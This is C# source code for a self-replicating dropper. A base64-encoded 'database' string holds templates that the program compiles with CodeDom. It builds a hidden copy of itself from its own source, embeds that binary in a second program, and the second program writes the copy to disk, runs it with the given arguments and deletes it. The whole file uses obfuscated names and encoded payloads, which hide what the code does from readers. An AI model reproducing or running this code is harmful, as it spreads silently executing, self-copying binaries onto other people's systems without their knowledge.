using System;
using System.CodeDom;
using System.IO;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Text;
namespace L153
{
    class XProgramX
    {
        private static string database = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvZGVEb207DQp1c2luZyBTeXN0ZW0uSU87DQp1c2luZyBTeXN0ZW0uQ29kZURvbS5Db21waWxlcjsNCnVzaW5nIE1pY3Jvc29mdC5DU2hhcnA7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uVGV4dDsNCm5hbWVzcGFjZSBNMTUzDQp7DQogICAgY2xhc3MgWFByb2dyYW1YDQogICAgew0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGF0YWJhc2UgPSAi>IjsNCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgeHBhcmFtc3ggPSAiIjsNCiAgICAgICAgICAgIGZvciAoaW50IGNpayA9IDA7IGNpayA8IGFyZ3MuTGVuZ3RoOyBjaWsrKykNCiAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgeHBhcmFtc3ggKz0gYXJnc1tjaWtdICsgIiAiOyANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHN0cmluZ1tdIGp0aiA9IGRhdGFiYXNlLlNwbGl0KG5ldyBjaGFyW10geyAnPicgfSk7DQogICAgICAgICAgICBpbnQgeXR5ID0gbmV3IFJhbmRvbSgpLk5leHQoOTk5OSk7DQogICAgICAgICAgICBzdHJpbmcgZmlsZW5hbWUgPSAicCIgKyB5dHkgKyAiaC5leGUiOw0KICAgICAgICAgICAgQnVpbGQoZmlsZW5hbWUpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlsZVN0cmVhbSBmczEzMyA9IG5ldyBGaWxlU3RyZWFtKGZpbGVuYW1lLCBGaWxlTW9kZS5PcGVuT3JDcmVhdGUsIEZpbGVBY2Nlc3MuUmVhZCk7DQogICAgICAgICAgICAgICAgaW50IGlwcGMgPSAoaW50KWZzMTMzLkxlbmd0aDsNCiAgICAgICAgICAgICAgICBzdHJpbmcgZyA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoUmVhZHgoZnMxMzMsIGlwcGMsIDApKTsNCiAgICAgICAgICAgICAgICBzdHJpbmcgeGNvZGV4ID0gZGVjb2RlYjY0KGp0alsyXSkgKyBnICsgZGVjb2RlYjY0KGp0alszXSk7DQogICAgICAgICAgICAgICAgYm9vbCBtYWtlZXhlID0gQnVpbGRFeGUoIlVQSFIiICsgeXR5ICsgIi5leGUiLCB4Y29kZXgpOw0KICAgICAgICAgICAgICAgIGlmIChtYWtlZXhlID09IGZhbHNlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IFN5c3RlbS5JbnZhbGlkUHJvZ3JhbUV4Y2VwdGlvbigpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmaW5hbGx5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoZmlsZW5hbWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgQnVpbGQoc3RyaW5nIGZpbGVuYW1leCkNCiAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHh0eCA9IGRhdGFiYXNlLlNwbGl0KG5ldyBjaGFyW10geyAnPicgfSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIHhjb2RleCA9IGRlY29kZWI2NCh4dHhbMF0pICsgZGF0YWJhc2UgKyBkZWNvZGViNjQoeHR4WzFdKTsNCiAgICAgICAgICAgICAgICBib29sIG1ha2VleGUgPSBCdWlsZEV4ZShmaWxlbmFtZXgsIHhjb2RleCk7DQogICAgICAgICAgICAgICAgaWYgKG1ha2VleGUgPT0gZmFsc2UpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgU3lzdGVtLkludmFsaWRQcm9ncmFtRXhjZXB0aW9uKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIGJvb2wgQnVpbGRFeGUoc3RyaW5nIHpuYW1lLCBzdHJpbmcgY29kZXkpDQogICAgICAgIHsNCiAgICAgICAgICAgIElDb2RlQ29tcGlsZXIgdmljID0gbmV3IENTaGFycENvZGVQcm92aWRlcigpLkNyZWF0ZUNvbXBpbGVyKCk7DQogICAgICAgICAgICBDb21waWxlclBhcmFtZXRlcnMgb2NwID0gbmV3IENvbXBpbGVyUGFyYW1ldGVycygpOw0KICAgICAgICAgICAgb2NwLlJlZmVyZW5jZWRBc3NlbWJsaWVzLkFkZCgiU3lzdGVtLmRsbCIpOw0KICAgICAgICAgICAgb2NwLkdlbmVyYXRlRXhlY3V0YWJsZSA9IHRydWU7DQogICAgICAgICAgICBvY3AuQ29tcGlsZXJPcHRpb25zID0gIi90YXJnZXQ6d2luZXhlIjsNCiAgICAgICAgICAgIG9jcC5PdXRwdXRBc3NlbWJseSA9IHpuYW1lOw0KICAgICAgICAgICAgQ29tcGlsZXJSZXN1bHRzIHpyZXN1bHRzID0gdmljLkNvbXBpbGVBc3NlbWJseUZyb21Tb3VyY2Uob2NwLCBjb2RleSk7DQogICAgICAgICAgICBmb3JlYWNoIChDb21waWxlckVycm9yIHh2Y2UgaW4genJlc3VsdHMuRXJyb3JzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKHh2Y2UuRXJyb3JOdW1iZXIgKyAiOiAiICsgeHZjZS5FcnJvclRleHQpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoenJlc3VsdHMuRXJyb3JzLkNvdW50ID09IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBkZWNvZGViNjQoc3RyaW5nIGRvbm55KQ0KICAgICAgICB7DQogICAgICAgICAgICBieXRlW10gcGxhaW54ID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGRvbm55KTsNCiAgICAgICAgICAgIHJldHVybiBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhwbGFpbngpOw0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIGJ5dGVbXSBSZWFkeChGaWxlU3RyZWFtIHN4dHJlYW0sIGludCB4bGVuZ3RoLCBpbnQgY2NjdXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIEJpbmFyeVJlYWRlciB3MzMgPSBuZXcgQmluYXJ5UmVhZGVyKHN4dHJlYW0pOw0KICAgICAgICAgICAgdzMzLkJhc2VTdHJlYW0uU2VlayhjY2N1ciwgU2Vla09yaWdpbi5CZWdpbik7DQogICAgICAgICAgICBieXRlW10gYnl0ZXMyID0gbmV3IGJ5dGVbeGxlbmd0aF07DQogICAgICAgICAgICBpbnQgbnVtQnl0ZXNUb1JlYWQyID0gKGludCl4bGVuZ3RoOw0KICAgICAgICAgICAgaW50IG51bUJ5dGVzUmVhZDIgPSAwOw0KICAgICAgICAgICAgd2hpbGUgKG51bUJ5dGVzVG9SZWFkMiA+IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaW50IG4wMCA9IHczMy5SZWFkKGJ5dGVzMiwgbnVtQnl0ZXNSZWFkMiwgbnVtQnl0ZXNUb1JlYWQyKTsNCiAgICAgICAgICAgICAgICBpZiAobjAwID09IDApDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIG51bUJ5dGVzUmVhZDIgKz0gbjAwOw0KICAgICAgICAgICAgICAgIG51bUJ5dGVzVG9SZWFkMiAtPSBuMDA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB3MzMuQ2xvc2UoKTsNCiAgICAgICAgICAgIHJldHVybiBieXRlczI7DQogICAgICAgIH0NCiAgICB9DQp9DQo=>dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KbmFtZXNwYWNlIE0xNTMNCnsNCiAgICBjbGFzcyBQcm9ncmFtDQogICAgew0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGF0YWJhc2UgPSAi>IjsNCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgeHBhcmFtc3ggPSAiIjsNCiAgICAgICAgICAgIGZvciAoaW50IGNpayA9IDA7IGNpayA8IGFyZ3MuTGVuZ3RoOyBjaWsrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB4cGFyYW1zeCArPSBhcmdzW2Npa10gKyAiICI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpbnQgeXR5ID0gbmV3IFJhbmRvbSgpLk5leHQoOTk5OSk7DQogICAgICAgICAgICBzdHJpbmcgZmlsZW5hbWUgPSAiciIgKyB5dHkgKyAidS5leGUiOw0KICAgICAgICAgICAgRmlsZVN0cmVhbSBmczYgPSBuZXcgRmlsZVN0cmVhbShmaWxlbmFtZSwgRmlsZU1vZGUuT3Blbk9yQ3JlYXRlLCBGaWxlQWNjZXNzLldyaXRlKTsNCiAgICAgICAgICAgIFdyaXRleChmczYsIENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhkYXRhYmFzZSkpOw0KICAgICAgICAgICAgZnM2LkNsb3NlKCk7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBQcm9jZXNzU3RhcnRJbmZvIHByb2NpbmZvID0gbmV3IFByb2Nlc3NTdGFydEluZm8oZmlsZW5hbWUsIEB4cGFyYW1zeCk7DQogICAgICAgICAgICAgICAgUHJvY2VzcyB4dHggPSBQcm9jZXNzLlN0YXJ0KHByb2NpbmZvKTsNCiAgICAgICAgICAgICAgICB4dHguV2FpdEZvckV4aXQoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZmluYWxseQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZpbGUuRGVsZXRlKGZpbGVuYW1lKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFdyaXRleChGaWxlU3RyZWFtIHN4dHJlYW0sIGJ5dGVbXSBncmVlbikNCiAgICAgICAgew0KICAgICAgICAgICAgQmluYXJ5V3JpdGVyIHJpdHcgPSBuZXcgQmluYXJ5V3JpdGVyKHN4dHJlYW0pOw0KICAgICAgICAgICAgcml0dy5CYXNlU3RyZWFtLlNlZWsoMCwgU2Vla09yaWdpbi5CZWdpbik7DQogICAgICAgICAgICByaXR3LldyaXRlKGdyZWVuKTsNCiAgICAgICAgICAgIHJpdHcuRmx1c2goKTsNCiAgICAgICAgICAgIHJpdHcuQ2xvc2UoKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg==";
        static void Main(string[] args)
        {
            string xparamsx = "";
            for (int cik = 0; cik < args.Length; cik++)
            { 
                xparamsx += args[cik] + " "; 
            }
            string[] jtj = database.Split(new char[] { '>' });
            int yty = new Random().Next(9999);
            string filename = "p" + yty + "h.exe";
            Build(filename);
            try
            {
                FileStream fs133 = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Read);
                int ippc = (int)fs133.Length;
                string g = Convert.ToBase64String(Readx(fs133, ippc, 0));
                string xcodex = decodeb64(jtj[2]) + g + decodeb64(jtj[3]);
                bool makeexe = BuildExe("UPHR" + yty + ".exe", xcodex);
                if (makeexe == false)
                {
                    throw new System.InvalidProgramException();
                }

            }
            catch
            {
                ;
            }
            finally
            {
                File.Delete(filename);
            }
        }
        private static void Build(string filenamex)
        {
                string[] xtx = database.Split(new char[] { '>' });
                string xcodex = decodeb64(xtx[0]) + database + decodeb64(xtx[1]);
                bool makeexe = BuildExe(filenamex, xcodex);
                if (makeexe == false)
                {
                    throw new System.InvalidProgramException();
                }
        }
        private static bool BuildExe(string zname, string codey)
        {
            ICodeCompiler vic = new CSharpCodeProvider().CreateCompiler();
            CompilerParameters ocp = new CompilerParameters();
            ocp.ReferencedAssemblies.Add("System.dll");
            ocp.GenerateExecutable = true;
            ocp.CompilerOptions = "/target:winexe";
            ocp.OutputAssembly = zname;
            CompilerResults zresults = vic.CompileAssemblyFromSource(ocp, codey);
            foreach (CompilerError xvce in zresults.Errors)
            {
                Console.WriteLine(xvce.ErrorNumber + ": " + xvce.ErrorText);
            }

            if (zresults.Errors.Count == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private static string decodeb64(string donny)
        {
            byte[] plainx = Convert.FromBase64String(donny);
            return Encoding.UTF8.GetString(plainx);
        }
        private static byte[] Readx(FileStream sxtream, int xlength, int cccur)
        {
            BinaryReader w33 = new BinaryReader(sxtream);
            w33.BaseStream.Seek(cccur, SeekOrigin.Begin);
            byte[] bytes2 = new byte[xlength];
            int numBytesToRead2 = (int)xlength;
            int numBytesRead2 = 0;
            while (numBytesToRead2 > 0)
            {
                int n00 = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
                if (n00 == 0)
                    break;
                numBytesRead2 += n00;
                numBytesToRead2 -= n00;
            }
            w33.Close();
            return bytes2;
        }
    }
}
